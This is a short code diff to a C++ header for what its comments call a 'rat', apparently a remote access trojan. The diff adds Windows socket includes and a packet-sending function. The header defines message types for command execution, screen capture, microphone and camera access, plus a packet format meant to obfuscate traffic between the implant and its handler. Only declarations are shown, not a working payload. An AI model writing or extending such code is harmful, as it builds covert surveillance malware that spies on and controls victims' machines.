@@ -8,6 +8,13 @@
 #include <sstream>
 #include <vector>
 
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+// defines behaviour for the socket to use (flags)
+// 0 -> default behaviour
+extern const int behaviour;
+
 // custom packet send across a socket to obfuscate
 // communication between rat and handler
 enum class MsgType { INIT, EXEC, SCREEN, MIC, CAMERA, NONE };
@@ -46,6 +53,8 @@ namespace RatPacketUtils {
     std::string ToHex(const std::string& input);
     std::string FromHex(const std::string& hex);
     std::string FormatHex(const std::string& input);
+
+    bool Send(SOCKET& sock, const RatPacket& packet);
 };
 
 #endif
